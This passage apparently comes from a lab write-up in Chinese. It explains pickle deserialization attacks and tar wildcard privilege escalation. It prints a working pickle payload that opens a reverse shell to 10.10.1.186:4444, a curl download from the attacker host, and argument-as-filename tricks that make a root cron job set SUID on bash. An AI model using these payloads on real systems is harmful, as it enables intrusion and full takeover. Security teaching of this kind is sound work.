### **<span style="color:#3498db">pickle 反序列化为什么危险</span>**

**pickle 是 Python 的序列化格式**（对象 ↔ 字节流）。它的问题在于：反序列化（`pickle.loads`）时，解释器会**按照数据里的指令去"重建对象"——重建过程可以调用任意函数**。也就是说，**谁控制了 pickle 数据，谁就控制了执行权**。

还有一个专门的"开洞"魔术方法 **`__reduce__`**：类里定义它之后，序列化时会返回一个元组：

```python
return (可调用对象, (参数,))
```

反序列化时 Python 会**真的去调用 `可调用对象(*参数)`**。那就写个类，让它返回 `(os.system, (命令,))`：

```python
import pickle, base64

class Exploit:
    def __reduce__(self):
        cmd = 'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'10.10.1.186\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/bash\'])" &'
        return (__import__("os").system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

![mm](/assets/img/2025-07-20-19-52-22.png)

把导出配置的内容替换成这个 payload 再导入回去，触发反序列化：**代码在"读配置"的时候执行了**，拿到 shell（命令末尾的 `&` 让反弹进程后台跑，不被反序列化流程卡住）：

### **<span style="color:#3498db">pspy 盯进程找提权点</span>**

翻了一圈常规提权点都没有收获。换个视角：**看看 root 在定期干什么**。`ps`/`top` 都是瞬时的，一闪而过的定时任务根本抓不到——用 **pspy** 持续监控新进程。服务器没网装不了，从攻击机下载到 `/tmp` 再跑：

```bash
curl http://10.10.1.186:8888/pspy64 -o pspy64
chmod +x pspy64 && ./pspy64
```

![mm](/assets/img/2025-07-21-10-22-23.png)

pspy 里现身：**每分钟**都有一条 root 执行的 `tar` 打包命令，而被打包目录当前用户可写。tar 的 `--checkpoint` / `--checkpoint-action` 参数能在"打包到第几个文件"时执行命令——**把参数做成文件名**放进目录，等 cron 的通配符 `*` 展开时被 tar 当参数解析：

```bash
cd /var/log/yx-analytics
touch -- '--checkpoint=1'
echo 'chmod u+s /bin/bash' >> cc.sh
touch -- "--checkpoint-action=exec=bash cc.sh"
```

等一分钟，`/bin/bash` 被加上 SUID，原地提权：

```bash
/bin/bash -p
whoami   # root
```

![mm](/assets/img/2025-07-21-10-32-13.png)

入口是"把不可信数据当 pickle 读"，出口是"root 定时任务里的 tar 通配符"——两头都是"信任了不该信任的输入"。
